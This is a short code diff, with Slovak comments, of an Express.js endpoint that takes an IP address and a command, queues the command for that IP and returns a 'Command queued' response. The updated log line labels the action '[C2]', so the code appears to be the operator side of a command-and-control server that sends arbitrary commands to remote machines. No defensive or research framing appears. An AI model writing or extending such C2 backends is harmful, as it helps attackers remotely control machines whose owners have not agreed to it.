@@ -38,16 +38,19 @@ app.listen(PORT, '0.0.0.0', () => {
 });
 app.post('/api/send-command', (req, res) => {
     const { ip, command } = req.body;
-    
+
     if (!ip || !command) {
-        return res.status(400).send({ error: "Chýba IP alebo príkaz" });
+        return res.status(400).json({ error: "Chýba IP alebo príkaz" });
     }
 
+    // Inicializuj frontu príkazov pre danú IP, ak neexistuje
     if (!serverCommands[ip]) {
         serverCommands[ip] = [];
     }
 
     serverCommands[ip].push(command);
-    console.log(`Príkaz [${command}] pridaný pre IP: ${ip}`);
-    res.json({ status: "queued" });
+    console.log(`[C2] Príkaz pridaný pre ${ip}: ${command}`);
+
+    // ODPOVEĎ PRE FRONTEND (Dôležité!)
+    res.status(200).json({ status: "success", message: "Command queued" });
 });
